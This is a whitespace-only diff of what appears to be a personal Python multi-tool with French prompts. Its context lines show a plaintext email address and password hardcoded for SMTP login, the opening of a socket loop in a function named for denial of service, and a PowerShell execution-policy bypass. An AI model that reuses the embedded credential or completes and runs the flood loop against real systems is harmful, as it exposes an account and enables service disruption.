@@ -76,30 +76,24 @@ while error<=stop_code:
             # Set up the SMTP server
             smtp_server = '127.0.0.1'  # Your SMTP server address
             port = 587  # Your SMTP server port
-
             sender_email = 'benji77430@gmail.com'  # Your email address
             password = 'benji10112008'  # Your email password
-
             # Create a multipart message
             msg = MIMEMultipart()
             msg['From'] = sender_email
             msg['To'] = to_email
             msg['Subject'] = subject
-
             # Add message body
             msg.attach(MIMEText(message, 'plain'))
-
             # Start the SMTP session
             with smtplib.SMTP(smtp_server, port) as server:
                 server.starttls()  # Secure the connection
                 server.login(sender_email, password)
                 server.send_message(msg)
-
         # Usage
         subject = 'Test email'
         message = 'This is a test email sent via Python.'
         to_email = 'recipient@example.com'
-
         def detect_language(text):
             try:
                 language = detect(text)
@@ -600,8 +594,6 @@ Administrateur'''
                 class Count:
                     packetCounter = 0 
                 def goForDosThatThing():
-                    
-
                     try:
                         while True:
                             dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -994,11 +986,9 @@ PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 
                             print("le fichier a été créer veuillez recommencer en entrant votre texte dedans a C:/fsociety/text.txt")
                             os.startfile('text.txt')
                             time.sleep(2)
-                    
                 else: 
                     print(f'{add_words_to_file(input("Entrez les mots à ajouter (séparés par des espaces) : ").split(), words)} mot ont été ajoutées')
                 time.sleep(2)
-
     except Exception as e:
         try:
             with open(f'C:/Users/{getpass.getuser()}/desktop/error log.txt', 'a') as f:
